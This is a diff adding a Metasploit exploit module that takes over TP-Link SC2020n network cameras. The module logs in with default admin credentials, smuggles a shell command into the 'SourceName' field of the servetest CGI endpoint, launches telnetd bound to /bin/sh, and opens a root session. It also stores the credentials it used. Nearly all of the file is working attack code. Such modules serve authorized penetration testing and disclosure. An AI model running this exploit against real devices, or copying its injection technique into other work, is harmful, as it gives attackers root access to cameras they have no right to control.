@@ -1,0 +1,204 @@
+##
+## This module requires Metasploit: http://metasploit.com/download
+## Current source: https://github.com/rapid7/metasploit-framework
+###
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+
+    include Msf::Exploit::Remote::Telnet
+    include Msf::Exploit::Remote::HttpClient
+
+    def initialize(info = {})
+        super(update_info(info,
+          'Name'        => 'TP-Link SC2020n Authenticated Telnet Injection',
+          'Description' => %q{
+            The TP-Link SC2020n Network Video Camera is vulnerable
+            to OS Command Injection via the web interface. By firing up the telnet daemon,
+            it is possible to gain root on the device.  The vulnerability
+            exists at /cgi-bin/admin/servetest, which is accessible with credentials.
+          },
+          'Author'      =>
+            [
+                'Nicholas Starke <nick@alephvoid.com>'
+            ],
+          'License'         => MSF_LICENSE,
+          'DisclosureDate'  => 'Dec 20 2015',
+          'Privileged'      => true,
+          'Platform'        => 'unix',
+          'Arch'            => ARCH_CMD,
+          'Payload'         =>
+            {
+              'Compat'  => {
+              'PayloadType'    => 'cmd_interact',
+              'ConnectionType' => 'find',
+              },
+            },
+          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
+          'Targets'        =>
+            [
+              [  'Automatic',     { } ],
+            ],
+          'DefaultTarget'  => 0
+         ))
+
+        register_options(
+          [
+            OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
+            OptString.new('PASSWORD', [ true, 'Password to login with', 'admin'])
+          ], self.class)
+
+        register_advanced_options(
+          [
+            OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet Command', 10]),
+            OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
+          ], self.class)
+    end
+
+    def telnet_timeout
+      (datastore['TelnetTimeout'] || 10).to_i
+    end
+
+    def banner_timeout
+      (datastore['TelnetBannerTimeout'] || 25).to_i
+    end
+
+    def exploit
+      print_status('Exploiting')
+      user = datastore['USERNAME']
+      pass = datastore['PASSWORD']
+      test_login(user, pass)
+      exploit_telnet
+    end
+
+
+    def test_login(user, pass)
+        print_status("Trying to login with #{user} : #{pass}")
+        begin
+          res = send_request_cgi({
+            'uri' => '/',
+            'method' => 'GET',
+            'authorization' => basic_auth(user, pass)
+          })
+
+          if res.nil?
+            fail_with(Failure::Unknown, "Could not connect to web service - no response")
+          end
+
+          if (res.code != 200)
+            fail_with(Failure::Unknown, "Could not connect to web service - invalid credentials (response code: #{res.code}")
+          else
+            print_good("Successful login #{user} : #{pass}")
+            save_cred(user, pass)
+          end
+        rescue ::Rex::ConnectionError
+          fail_with(Failure::Unknown, "Could not connect to the web service")
+        end
+    end
+
+    def exploit_telnet
+        telnet_port = rand(32767) + 32768
+
+        print_status("Telnet Port: #{telnet_port}")
+
+        cmd = "telnetd -p #{telnet_port} -l/bin/sh"
+
+        telnet_request(cmd)
+
+        print_status("Trying to establish telnet connection...")
+        ctx = { 'Msf' => framework, 'MsfExploit' => self }
+        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port, 'Context' => ctx, 'Timeout' => telnet_timeout })
+
+        begin
+          if sock.nil?
+            fail_with(Failure::Unreachable, "Backdoor service unreachable")
+          end
+
+          add_socket(sock)
+
+          print_status("Trying to establish a telnet session...")
+          prompt = negotiate_telnet(sock)
+
+          if prompt.nil?
+            sock.close
+            fail_with(Failure::Unknown, "Unable to establish a telnet session")
+          else
+            print_good("Telnet session successfully established")
+          end
+
+          handler(sock)
+        rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+          sock.close if sock
+          fail_with(Failure::Unknown, e.message)
+        end
+    end
+
+    def telnet_request(cmd)
+
+        uri = '/cgi-bin/admin/servetest'
+
+        begin
+          res = send_request_cgi({
+            'uri' => uri,
+            'method' => 'GET',
+            'vars_get' => {
+                'cmd' => 'ftp',
+                'ServerName' => 'test',
+                'userName' => 'test',
+                'Password' => 'test',
+                'Passive' => 'off',
+                'SourceName' => "/var/ftptest;#{cmd};#",
+                'TargetName' => 'testfile'
+            }
+          })
+          return res
+        rescue ::Rex::ConnectionError
+          fail_with(Failure::Unreachable, "Could not connect to the web service")
+        end
+    end
+
+    def negotiate_telnet(sock)
+      begin
+        Timeout.timeout(banner_timeout) do
+          while(true)
+            data = sock.get_once(-1, telnet_timeout)
+            return nil if not data or data.length == 0
+            if data =~ /#/
+              return true
+            end
+          end
+        end
+      rescue ::Timeout::Error
+        return nil
+      end
+    end
+
+  def save_cred(username, password)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'telnet',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: username,
+      private_data: password,
+      private_type: :password
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+end
